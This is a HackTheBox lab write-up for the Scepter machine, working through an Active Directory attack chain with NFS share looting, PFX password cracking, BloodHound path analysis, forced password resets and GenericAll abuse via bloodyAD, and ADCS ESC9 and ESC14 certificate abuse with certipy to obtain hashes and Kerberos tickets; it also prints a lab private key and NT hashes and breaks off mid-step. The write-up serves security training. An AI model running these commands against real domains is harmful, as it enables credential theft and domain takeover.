---
title: "HTB Scepter Writeup"
date: 2025-07-19 18:00:00 +0000
layout: post
categories: [CTF, Writeup, HackTheBox]
tags: [hackthebox, htb, ESC14A, ESC9A, ForceChangePassword, genericAll, dacl_abuse, active_directory_exploitation, ad_exploitation, adcs]
description: "The Scepter (Windows - Hard) Box from Hackthebox. Including ADCS ESC9A and ADCS ESC14A abuse with DACL abuse"
image: "/assets/images/HTB-Scepter/Pasted_image_20250718054233.png"
---


![](/assets/images/HTB-Scepter/Pasted_image_20250718054233.png)

## NMAP Enumeration

```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-06 10:26:38Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC 
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T10:27:32+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
|_ssl-date: 2025-06-06T10:27:33+00:00; +7h59m58s from scanner time.
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T10:27:32+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-01T03:22:33
| Not valid after:  2025-11-01T03:22:33
| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=dc01.scepter.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
```

The `nmap` result shows nothing interesting except port `2049 - nlockmgr` . 

>> Network File Share Protocol
>>
>>The `2049` port is commonly associated with the NFS (Network File System) service, while `nlockmgr` (Network Lock Manager) typically operates on a dynamic port assigned by the system, although it can be statically defined for firewalling purposes. `nlockmgr` is a crucial component of NFS that handles file locking across the network, ensuring that multiple clients don’t overwrite or corrupt shared files during concurrent access. It works in conjunction with the `rpc.statd` service to maintain lock states, especially during crashes or reboots. Ensuring secure configuration of `nlockmgr` and NFS is critical, as they can expose systems to remote attacks if improperly secured.


### Network File System Enumeration

The NFS expose `/helpdesk` share. Accessible by `everyone`.
Quickly created tempshare folder and than mount `/helpdesk` into it. Copied my local and than `unmount` with `umount` .

![](/assets/images/HTB-Scepter/Pasted_image_20250718055617.png)


## PKCS12 Cracking

>> What is pfx file ?
>> 
>>A `.pfx` file, also known as a PKCS#12 file, is a binary format that stores a private key along with the associated public key certificate and, optionally, the certificate chain. Commonly used for importing and exporting certificates and private keys on Windows systems, `.pfx` files are essential for tasks like enabling HTTPS on web servers, securing email (S/MIME), or client authentication. Because they contain sensitive private key material, `.pfx` files are typically password-protected and should be stored securely to prevent unauthorized access.

When i tried to look pfx files content with `openssl` , find out the `pfx` files are password protected.

```bash
┌──(root㉿kali2025)-[~/…/HackTheBox/machines/scepter/nfsshare]
└─# openssl pkcs12 -info -in clark.pfx 
Enter Import Password:
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
Mac verify error: invalid password?

┌──(root㉿kali2025)-[~/…/HackTheBox/machines/scepter/nfsshare]
└─# openssl pkcs12 -info -in lewis.pfx 
Enter Import Password:
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
Mac verify error: invalid password?

┌──(root㉿kali2025)-[~/…/HackTheBox/machines/scepter/nfsshare]
└─# openssl pkcs12 -info -in scott.pfx 
Enter Import Password:
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
Mac verify error: invalid password?

```

To crack `pfx` files using `pfx2john` tool for bruteforcable format.

```bash
pfx2john nfsshare/clark.pfx > clark.hashes
```

Successfully cracked with old friend `john` .

![](/assets/images/HTB-Scepter/Pasted_image_20250718060934.png)

Verifying the password is correct

```bash
┌──(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# openssl pkcs12 -in nfsshare/clark.pfx -nocerts -nodes -passin pass:newpassword 
Bag Attributes
    localKeyID: E1 84 EA CC 0B 68 19 40 D4 CA 6B 14 C1 8E 9E 30 E7 AA 48 B4 
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDdrPemdIl0KT5N
X3+cS1g3/es5nfAsX7FcmiGmD9kodovcTtOnxLvXCQc4iANb+OeJECO+0CRU3Sph
DxYLy1Wwv9KAGb1bkQfMsoavUp2eRkhm6IuYKfFzeBSdzfBF86C4k74n28pZRbgW
1wRg436z7725nWwjcKgz9rZscqBBhcfCs6I9RRJnPRSCR7btyYoE7a8YT0CL/23T
GSLp5xHflK2IctGunvg1GbdsJ/AtuoyOqhkKHVgFuTOhlzGMx7MNQBuB9jQOd9Oz
GHwB0/ANPIL5vQpii5GwkMACAMuifHDKVO50ANRPm2oJHWm9YRtpgVDyOIRya/4d
hDftRqWNAgMBAAECggEAI9NB3Mlls3u84WVHKtu0YKwtOU0QlSNL9zLDsGJMTrFF
7i9hHnJ5hwmi/JxiqpkB1lFg7YQW8w4hPLli7zoH2b5OhzxhsWwxbgAGK0x3Q66J
IfSAJvHUXzxvXId9RtjWRy49Y5SuUZomY66ROxVZEzxyFY7e/KVG0csT9VfbFWt7
3wdzY2KcZpcn+I91Wlhkmojt6iHJdIrTgGdL/GxgcAj1R9lYt87pJGZE/LN45oJD
JaFh/Wj548RNmO/PkdfWiNnJWrmDiXknbIUeAI1VI43zjxTE3CE4EJ127dGcftsF
ohlBsm4CkPfGCgtvnEgg+p2mCFKAPMvEvMrWGLEbQwKBgQD7O2YfZfOMa3O8wyFs
79BDtaXof3qHTQngpagZXI6wFsdrDC21uKV3YlRsqxibQx19ONJWZxAGKGfJYmhr
0zculbfh0958FT1+9T148bD4I8c0/gHo5MtyK3pT0Srp36Dcr4k0WA+BZ59WGqPw
NK7vDjbdr++GwDciiBSB4FHHuwKBgQDh4fhQDRXaHZZaniJ1yyAhMqlzA7gm9YwP
HJNWcde9IE0HTAXdrqgu8FhfBYwoKmILVnVcKOViFspXqoZ8f0SW3jldWuz9xAMj
/GIWWMvtK8RvfqRBSitKJfPVdTAss7oHx+sd+fdd1OsMuJl13e1GhvORAE+4kur3
36ZKWNJ/VwKBgGCkFsKZOziW1OyVuzPmhBynsWxgLUgCsHwD/UfUPOcrvAZHpwWy
Q6RK5OLwZgTDqoJS60ZlWtqjjFkBS92+YAnBefyavYjJuuAtgjoV7tdlG+ock6t8
523Bn8rCOVnBtmVt+L9z6HME41wB33I1Md2vgBeC6AbTxeG4qvrSyWKlAoGBAISD
W3gi5RHrT5xjrtWpz3SKUwwtP2hjnsHywqDw8l56R5YjTEGrx/CZgU5lY77gdlou
Y3UobMEpm5TobjM1OljDj6WrxOJujmUbF7QCbcf6aCf8hIHk8BZ0w2ITeKqQ2W7d
IpqYXT0HvsjctvKFukAoxVToeNxQHFZENzrgdsTLAoGBANoTOkeaIoSc4C8RyXLS
XY1UVqQLL2JfMzslc3HtCJru1Mx1C5EumF6qDkbQTnj52cj9/t7DOHqS+9z15Na0
erilQLHbPqmPt27z04OfKOsXHEgBKGDdvFKBioeZExWTmGkvwt4p0HwwJnxHv4EF
lI6PhL1ptAhHpO8tAY4frjRx
-----END PRIVATE KEY-----
```

The `newpassword` also valid for `scott.pfx` and `lewis.pfx` files.
Extract the unprotected `pfx` files and than try to authenticate.

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy cert -password newpassword -pfx nfsshare/clark.pfx -out clark_extracted.pfx
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'clark_extracted.pfx'
[*] Writing certificate and private key to 'clark_extracted.pfx'

┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# file clark_extracted.pfx 
clark_extracted.pfx: PEM certificate

┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# less clark_extracted.pfx 

┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy auth -pfx clark_extracted.pfx -dc-ip 10.10.11.65
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[-] Failed to load PFX file: Could not deserialize PKCS12 data
[-] Authentication failed: Could not deserialize PKCS12 data
[-] Use -debug to print a stacktrace

```

The other `pfx` files also doesn't valid for authenticate.
Gathering usernames from `pfx` files.

```bash
openssl pkcs12 -in clark.pfx -info -text -nodes -passin pass:newpassword                   
MAC: sha256, Iteration 2048                                                                   
MAC length: 32, salt length: 8                                                                
PKCS7 Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2048, PRF hmacWithSHA256
Certificate bag                                                                               
Bag Attributes                                                                                
    localKeyID: E1 84 EA CC 0B 68 19 40 D4 CA 6B 14 C1 8E 9E 30 E7 AA 48 B4 
subject=DC=htb, DC=scepter, CN=Users, CN=m.clark                
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA              
```

The usernames:

```text
m.clark
e.lewis
o.scott
d.baker
```


## Pass The Cert

Since `pfx` files are no use to us except username expose. The others files `baker.crt` (public key) and `baker.key` (private key) .

Examining the `baker.crt` . The result the username for this certificate is `d.baker` . 

```bash
┌──(venv)─(root㉿kali2025)-[~/…/HackTheBox/machines/scepter/nfsshare]
└─# head -n20 baker.crt                                                                        
Bag Attributes
    friendlyName: 
    localKeyID: DC 2B 20 65 C3 0D 91 40 E8 37 B5 CC 06 0F EA 66 5D 3B 7C 4E 
subject=DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
-----BEGIN CERTIFICATE-----
MIIGTDCCBTSgAwIBAgITYgAAADLhpcORUTEJewAAAAAAMjANBgkqhkiG9w0BAQsF
ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMjAxMTM0NloXDTI1
MTEwMjAxMTM0NlowdDETMBEGCgmSJomT8ixkARkWA2h0YjEXMBUGCgmSJomT8ixk
ARkWB3NjZXB0ZXIxDjAMBgNVBAMTBVVzZXJzMRAwDgYDVQQDEwdkLmJha2VyMSIw
IAYJKoZIhvcNAQkBFhNkLmJha2VyQHNjZXB0ZXIuaHRiMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEApYOPHHtw8CsIIS6mFkoI8CtD5I4Tu36JDSObdnYZ
kZ1eKW/Vif1rXL9LHykKhJbTGuJsEDSHKt7mYs0r49JU3HrW2ZIosuIhSq25gcql
73tnI7RoCc8n6zUZBQaiEJbbXAhcKJ1Tkarc3ZX3U9aHoKkklMJhyH01D/3xvGsM
6XbCFHby3HmnwouKph9/a7e2XPynHnYvwbU3POkJPm+P45Ko5r18VuELdHJBGOVx
9/aOxqQ9wU1Rqi4O711dWAenr8wfG0IUIEm2hmPKAfAJw+dKgpspe9TtUZlJs0M4
ZLa/xdhdySmr9snryirgSYD9KEzWx+0NsqaHfmM1aqsZEwIDAQABo4IDATCCAv0w
HQYDVR0OBBYEFDeUzFfjpMtVYxpHj4PQblDCNGNRMB8GA1UdIwQYMBaAFOuQVDjS
pmyJasttTaS6dRVgFSfjMIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8v
```

Also the private key file is password encrypted.

![](/assets/images/HTB-Scepter/Pasted_image_20250718063710.png)

The same password is valid for the `baker.key` private key file. 

```bash
openssl rsa -in baker.key -out dbaker.key -passin pass:newpassword
```

![](/assets/images/HTB-Scepter/Pasted_image_20250718063906.png)

Generating `pfx` file and than authenticate to box.

![](/assets/images/HTB-Scepter/Pasted_image_20250718064006.png)


## Preparation

This step is not always necessary, making preparations are always good. 

`/etc/hosts` file

`10.10.11.65     dc01.scepter.htb scepter.htb dc01`

`krb5.conf` file

```bash
┌──(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# nxc smb dc01.scepter.htb -u d.baker -H '18b5fb0d99e7a475316213c15b6f22ce' --generate-krb5-file krb5.conf
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.65     445    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 

┌──(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# cat krb5.conf 

[libdefaults]
    dns_lookup_kdc = true
    dns_lookup_realm = true
    default_realm = SCEPTER.HTB

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
        default_domain = scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
```

Updating clock

`ntpdate 10.10.11.65`


``
## Bloodhound Analysis

Gathering bloodhound data with `bloodhound-ce-python`

`bloodhound-ce-python -d scepter.htb -ns 10.10.11.65 -u 'd.baker' --hashes :18b5fb0d99e7a475316213c15b6f22ce --zip -c All`

![](/assets/images/HTB-Scepter/Pasted_image_20250718064838.png)

Gathering users on AD environment.

![](/assets/images/HTB-Scepter/Pasted_image_20250718070004.png)

`D.BAKER` users member of `STAFF@SCEPTER.HTB` group ^dbaker-staff-group

![](/assets/images/HTB-Scepter/Pasted_image_20250718070206.png)

When i check the `Outbound Object Control` , `d.baker` users has `ForceChangePassword` rights on `a.carter` .

![](/assets/images/HTB-Scepter/Pasted_image_20250718070400.png)

I'd like to be informed about other ACL's about other users. This query gave a lot information about the nodes. The query basically does any node has 1 or more edge bring it here.

```cypher
MATCH p=(n)-[*1..]->(c) 
RETURN p 
LIMIT 1000
```

I shared relevant part in below. `a.carter` user member of `IT SUPPORT` group. This group has `genericAll` rights on `STAFF ACCESS CERTIFICATE` OU ^staff-access-certificate-ou

![](/assets/images/HTB-Scepter/Pasted_image_20250718071331.png)

The attack path can also find following `Outbound Object Control` property. The interesting thing about this [OU](#staff-access-certificate-ou) , its affected only `d.baker` ^attack-path-it-support

![](/assets/images/HTB-Scepter/Pasted_image_20250718071748.png)

The other important information is about `p.adams` user. `p.adams` member of `REPLICATION OPERATORS` group, and this group can `DCSync` attack the DC. This means, if we are able to get `p.adams` we are achieving to dump `ntds.dit` file ^replication-operators-group

![](/assets/images/HTB-Scepter/Pasted_image_20250718072430.png)

Another piece of information about the `h.brown` user. This user member of `PROTECTED USERS` , `HELPDESK ADMINS` , `REMOTE MANAGEMENT USERS` and `CMS` groups.

Btw the only user member of these groups is `h.brown` 

![](/assets/images/HTB-Scepter/Pasted_image_20250718072922.png)

The last piece but most important information about `HELPDESK ENROLLMENT CERTIFICATE` OU
This OU affects `p.adams` user. ^helpdesk-enrollment-certificate-ou


![](/assets/images/HTB-Scepter/Pasted_image_20250718073712.png)
## Certificate Analysis


Gathering informations about AD Certificate Templates with `certipy` .

```bash
certipy find -dc-ip 10.10.11.65 -u d.baker -hashes 18b5fb0d99e7a475316213c15b6f22ce -stdout -text
```

Total 34 certificate template exist in AD environment. 

### StaffAccessCertificate

The first one is `StaffAccessCertificate` , This certificate is vulnerable to [ESC9](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template) attack. Any member of this group ( [d.baker](#dbaker-staff-group) ) has enrollment rights to this group. Also the [IT SUPPORT](#attack-path-it-support) group has `genericAll` rights on this certificate. 

![](/assets/images/HTB-Scepter/Pasted_image_20250718074405.png)


### HelpdeskEnrollmentCertificate

This certificate is the key to conquer AD. `Domain Computers` has `User Enrollable Principals` and `Enrollment rights` .


![](/assets/images/HTB-Scepter/Pasted_image_20250718075802.png)



## ForceChangePassword ACL Abuse

Setting password for `a.carter`

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' set password a.carter 'Password123.!'

```


## genericAll ACL Abuse

`a.carter` user has `genericAll` rights on `StaffAccessCertificate` template. To verify that i gave `d.baker` genericAll rights on `STAFF ACCESS CERTIFCATE` OU. 

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -u a.carter -p 'Password123.!' add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' d.baker
[+] d.baker has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```




## ESC9 Explotitation

The the enrollment requirements should be met defined in `Certificate Name Flag` .

```text
SubjectAltRequireEmail
SubjectRequireDnsAsCn
SubjectRequireEmail
```


![](/assets/images/HTB-Scepter/Pasted_image_20250718153335.png)

The `email` attributes empty for all the users. 

![](/assets/images/HTB-Scepter/Pasted_image_20250718155448.png)


When we try to set `mail` attribute of `d.baker` , got error `insufficient rights` .

![](/assets/images/HTB-Scepter/Pasted_image_20250718160021.png)

This issue happens, the explanation of this issue is [here](https://bloodhound.specterops.io/resources/edges/adcs-esc3#windows).

>>The ‘mail’ attribute can be set on both user and computer objects but the ‘dNSHostName’ attribute can only be set on computer objects. Computers have validated write permission to their own ‘dNSHostName’ attribute by default, but neither users nor computers can write to their own ‘mail’ attribute by default.


But `altSecurityIdentities` is defined for `h.brown` and the mapping flagged as **`weak`** 
Reference: [Explicit Certificate Mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#explicit-certificate-mapping)

![](/assets/images/HTB-Scepter/Pasted_image_20250718153605.png)

The [genericAll Rights on StaffAccessCertificate](#staff-access-certificate-ou) from blodhound analysis phase, we can set `d.baker` mail or any other attribute with `a.carter` .

There are 2 article has explain the steps of ESC9 Attack.
[ADCSESC9a](https://bloodhound.specterops.io/resources/edges/adcs-esc9a)
[ESC9: No Security Extension on Certificate Template](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template)

So steps are below.
##### 1\. update victims account upn

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy account -dc-ip 10.10.11.65 -u 'a.carter@scepter.htb' -p 'Password123.!' -user 'd.baker' -upn 'h.brown' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'd.baker':
    userPrincipalName                   : h.brown 
[*] Successfully updated 'd.baker
```

##### 1.2 update victim account's email attribute

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -u a.carter -p 'Password123.!' set object d.baker 'mail' -v 'h.brown@scepter.htb'                                                                    
[+] d.baker's mail has been updated
```

##### 2\. Obtain newly created ccache ticket

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -u a.carter -p 'Password123.!' add shadowCredentials d.baker
[+] KeyCredential generated with following sha256 of RSA key: 381b4f3ffb79ed80da8e2c76361e74923fc9b6c75640c215e0059fcc4e130f9e
[+] TGT stored in ccache file d.baker_e1.ccache

NT: 18b5fb0d99e7a475316213c15b6f22ce

```

##### 3\. Request Certificate via vulnerable template

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# KRB5CCNAME=d.baker_e1.ccache certipy req -k -dc-ip 10.10.11.65 -target dc01.scepter.htb -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'                                                 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 3                              
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'd.baker.pfx'
[*] Wrote certificate and private key to 'd.baker.pfx'

```

##### 4\. Restore victim account's upn

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy account -dc-ip 10.10.11.65 -u 'a.carter@scepter.htb' -p 'Password123.!' -user 'd.baker' -upn 'd.baker' update                           
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'd.baker':
    userPrincipalName                   : d.baker 
[*] Successfully updated 'd.baker'

```

##### 5\. Get NT hash via pfx file

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy auth -dc-ip 10.10.11.65 -pfx d.baker.pfx -username 'h.brown' -domain scepter.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'h.brown@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT                                      
[*] Saving credential cache to 'h.brown.ccache'
[*] Wrote credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

## ESC14A Write Access on altSecurityIdentities

Authenticating as `h.brown` with `NTLM` is not possible due to `Protected Users` . Since the only user `h.brown` member of `Remote Management Users` . 

### What is Protected Users Group

>>The **Protected Users group** in Active Directory (introduced in Windows Server 2012 R2) is a special security group designed to enhance the security of privileged accounts by enforcing stricter authentication policies. When a user is added to this group, certain legacy and insecure authentication mechanisms are disabled for that account. For example, the use of **NTLM**, **Digest Authentication**, and **CredSSP** is blocked, and delegation scenarios such as **unconstrained delegation** and **protocol transition** are also prevented. Furthermore, **Ticket Granting Ticket (TGT)** lifetime is limited to 4 hours by default, reducing the window for potential misuse in case of ticket theft.

>>Regarding **Kerberos authentication**, when a user is in the Protected Users group, **Kerberos** becomes the only supported authentication protocol for domain services. However, this Kerberos usage is subject to strict enforcement: it does not cache credentials locally, requires AES encryption, and enforces stricter ticket policies. If a service or application only supports **NTLM**, authentication will fail for Protected Users, making compatibility planning critical. This enforcement helps mitigate risks like **pass-the-hash** and **pass-the-ticket** attacks, but may disrupt older systems or services that rely on legacy protocols.


`h.brown` has write access to `p.adams`'s `altSecurityIdentities` attribute.

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# KRB5CCNAME=h.brown.ccache bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -k get writable --detail

distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE

```

Also `h.brown` user has `SeMachineAccountPrivilege` , so `h.brown` can add machine account into AD environment. 

```bash
*Evil-WinRM* PS C:\Users\h.brown\appdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\h.brown\appdata> 
```
### Chaining the Attack Path

I'm already aware of  [bloodhound analysis](#helpdesk-enrollment-certificate-ou) `domain computers` has enrollment rights on `HeldeskEnrollmentCertificate` template . `h.brown` has privilege to add domain computers into AD environment and has write rights `altSecurityIdentities` on `p.adams` .

The attack path explained [ESC14 A](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities)

![](/assets/images/HTB-Scepter/Pasted_image_20250718164302.png)

##### 1\. first create machine account.

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]                                 
└─# bloodyAD -d scepter.htb --dc-ip 10.10.11.65 -u a.carter -p 'Password123.!' add computer ggwp 'Password123'                                                                                         
[+] ggwp created 
```

##### 2\. Ask certificate via machine.

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy req -ca 'scepter-DC01-CA' -target 10.10.11.65 -u 'ggwp$' -p 'Password123' -template 'Machine'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 28
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'ggwp.scepter.htb'
[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9108'
[*] Saving certificate and private key to 'ggwp.pfx'
File 'ggwp.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'ggwp.pfx'
```

###### 3\. and than extract serial number and issuer values from certificate

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy cert -pfx ggwp.pfx -nokey -out ggwp.crt                                    
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Data written to 'ggwp.crt'
[*] Writing certificate to 'ggwp.crt'

```

```bash
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
serial=620000001C2F55D7F04D35E78400000000001C
                                                                                                   
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# openssl x509 -noout -text -issuer -serial -in ggwp.crt

```

##### 4\. Add p.adams'in altSecurityIdentities attribute with Add-AltSecIDMapping.ps1.

with Get-AltSecIDMapping.ps1 we check we wrote properly or not.

```bash
PS C:\temp> Add-AltSecIDMapping -DistinguishedName "CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB" -MappingString "X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>1C000000000084E7354DF0D7552F1C00000062"
Add-AltSecIDMapping -DistinguishedName "CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB" -MappingString "X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>1C000000000084E7354DF0D7552F1C00000062"


PS C:\temp> Get-AltSecIDMapping -SearchBase "CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB"
Get-AltSecIDMapping -SearchBase "CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB"

CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>1C000000000084E7354DF0D7552F1C00000062
PS C:\temp> 

```

##### 5\. Get certificate of p.adams with ggwp machine account

```bash
┌──(venv)─(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# certipy auth -dc-ip 10.10.11.65 -pfx ggwp.pfx -username p.adams
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'ggwp.scepter.htb'
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-9108'
[!] The provided username does not match the identity found in the certificate: 'p.adams' - 'ggwp$'
Do you want to continue? (Y/n): Y
[*] Using principal: 'p.adams@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'p.adams.ccache'
File 'p.adams.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
